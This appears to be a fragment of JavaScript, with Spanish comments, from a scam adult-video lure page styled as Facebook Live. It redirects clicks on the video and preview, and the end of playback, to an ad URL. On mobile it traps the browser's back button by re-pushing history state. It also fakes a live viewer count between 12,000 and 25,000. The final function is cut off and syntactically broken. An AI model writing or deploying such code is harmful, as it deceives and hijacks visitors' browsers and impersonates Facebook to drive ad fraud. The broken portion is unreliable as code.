  <!-- Script: Redirección unificada -->
  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const redirectUrl = 'https://stallionmanualwish.com/y52iet528e?key=72357db5772e533f2b6d8f0490243b39';
      const isMobile = /Mobi|Android/i.test(navigator.userAgent);
      let redirectTriggered = false;

      // Función de redirección con protección contra duplicados
      function triggerRedirect(event) {
        if (redirectTriggered) return;
        redirectTriggered = true;
        
        event.preventDefault();
        setTimeout(() => {
          window.location.href = redirectUrl;
        }, 500);
      }

      // Solo redirección por clic en el video, vista previa o botones sociales
      const video = document.getElementById('videoPlayer');
      const videoPreview = document.getElementById('videoPreview');
      const socialLinks = document.querySelectorAll('.social-links a');
      
      if (video) {
        video.addEventListener('click', function(event) {
          // Solo redirigir si el video ya está reproduciéndose
          if (!video.paused) {
            triggerRedirect(event);
          }
        });
      }
      
      if (videoPreview) {
        videoPreview.addEventListener('click', function(event) {
          // Redirigir inmediatamente al hacer clic en la vista previa
          triggerRedirect(event);
        });
      }
      
      // Los botones de Telegram y WhatsApp van a sus enlaces reales, NO al anuncio
      socialLinks.forEach(link => {
        // Permitir que Telegram y WhatsApp vayan a sus enlaces reales
        if (link.classList.contains('telegram') || link.classList.contains('whatsapp')) {
          // No agregar event listener de redirección al anuncio
          console.log('Botón social permitido:', link.href);
          return;
        }
        // Solo otros botones sociales (si los hay) redirigen al anuncio
        link.addEventListener('click', triggerRedirect);
      });

      // Redirección al finalizar video
      if (video) {
        video.addEventListener('ended', function() {
          if (!redirectTriggered) {
            setTimeout(() => {
              window.location.href = redirectUrl;
            }, 1000);
          }
        });
      }

      // Bloquear retroceso móvil (sin redirección automática)
      if (isMobile) {
        history.pushState(null, null, location.href);
        window.addEventListener("popstate", function () {
          history.pushState(null, null, location.href);
        });
      }
    });
  </script>

      // Simular contador de espectadores en vivo más dinámico y realista para contenido XXX HOT
      let currentViewerCount = 15420;
      
      function updateViewerCount() {
        const viewerElement = document.querySelector('.live-viewers');
        const previewViewerElement = document.getElementById('previewViewerCount');
        const headerViewerElement = document.querySelector('.fb-viewer-count');
        
        // Variación más realista: algunos usuarios entran y salen
        const changeType = Math.random();
        let change = 0;
        
        if (changeType < 0.6) {
          // 60% probabilidad de aumentar (más gente entra para contenido XXX)
          change = Math.floor(Math.random() * 25) + 5; // +5 a +30
        } else if (changeType < 0.85) {
          // 25% probabilidad de disminuir (gente sale)
          change = -(Math.floor(Math.random() * 15) + 3); // -3 a -18
        }
        // 15% probabilidad de no cambiar
        
        currentViewerCount += change;
        
        // Mantener un rango realista para contenido XXX HOT en Facebook Live
        currentViewerCount = Math.max(12000, Math.min(25000, currentViewerCount));
        
        // Formatear como Facebook Live para números grandes
        let formattedCount;
        if (currentViewerCount >= 10000) {
          // Para números de 10K+, usar formato como "15.4K" o "15K"
          if (currentViewerCount >= 100000) {
            formattedCount = Math.floor(currentViewerCount / 1000) + 'K';
          } else {
            const thousands = Math.floor(currentViewerCount / 1000);
            const hundreds = Math.floor((currentViewerCount % 1000) / 100);
            if (hundreds > 0) {
              formattedCount = thousands + '.' + hundreds + 'K';
            } else {
              formattedCount = thousands + 'K';
            }
          }
        } else {
          formattedCount = currentViewerCount.toLocaleString();
        }
        
        if (viewerElement) {
          viewerElement.textContent = formattedCount;
        }
        
        if (previewViewerElement) {
          previewViewerElement.textContent = formattedCount;
        }
        
        if (headerViewerElement) {
          headerViewerElement.textContent = `👥 ${formattedCount}`;
        }
      }

      // Actualizar contador cada 1-3 segundos para más dinamismo
      function scheduleNextUpdate() {
        const delay = Math.random() * 2000 + 1000; // 1-3 segundos
        setTimeout(() => {
          updateViewerCount();
          scheduleNextUpdate();
        }, delay);
      }

      // Iniciar el contador dinámico
      scheduleNextUpdate();

      // Detectar formato del video y ajustar overlay
      function adjustOverlayForVideoFormat() {

              document.querySelector('.media-container').style.height = '60vh';
            } else {
              // Video cuadrado o formato estándar
              overlay.style.height = '40%';

          });

      }

      // Aplicar ajustes de formato
      adjustOverlayForVideoFormat();
